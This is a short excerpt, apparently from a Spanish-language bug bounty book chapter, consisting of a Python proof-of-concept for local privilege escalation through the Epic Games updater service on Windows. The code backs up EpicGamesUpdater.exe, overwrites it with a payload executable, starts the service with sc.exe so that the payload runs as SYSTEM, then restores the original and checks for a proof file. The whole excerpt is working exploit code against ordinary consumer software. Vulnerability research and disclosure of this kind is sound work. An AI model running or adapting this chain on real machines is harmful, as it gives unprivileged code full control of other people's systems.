# Extraído de: LibroBugBounty/cap-20-caso-epic.md
def exploit():
    """Cadena de explotacion completa con restauracion."""
    exe_path = EPIC_DIR / "EpicGamesUpdater.exe"
    backup = Path(os.environ["TEMP"]) / "EpicGamesUpdater.exe.bak"
    payload = find_payload_exe()

    # 1. Backup original
    shutil.copy2(exe_path, backup)

    # 2. Reemplazar con payload
    shutil.copy2(payload, exe_path)
    log("EpicGamesUpdater.exe reemplazado (FULL CONTROL)")

    # 3. Arrancar servicio SYSTEM
    r = subprocess.run(
        ["sc.exe", "start", "EpicGamesUpdater"],
        capture_output=True, text=True
    )
    # Error 1053 (timeout) es esperado: nuestro EXE
    # no implementa la API de servicios, pero el codigo
    # se ejecuta antes del timeout

    time.sleep(5)

    # 4. Restaurar INMEDIATAMENTE
    shutil.copy2(backup, exe_path)
    backup.unlink()
    log("Original restaurado. Sistema limpio.")

    # 5. Verificar evidencia
    evidence = Path("C:/Users/Public/epic_lpe_proof.txt")
    if evidence.exists():
        log("LPE A SYSTEM CONFIRMADA")
        print(evidence.read_text())
        return True
    return False
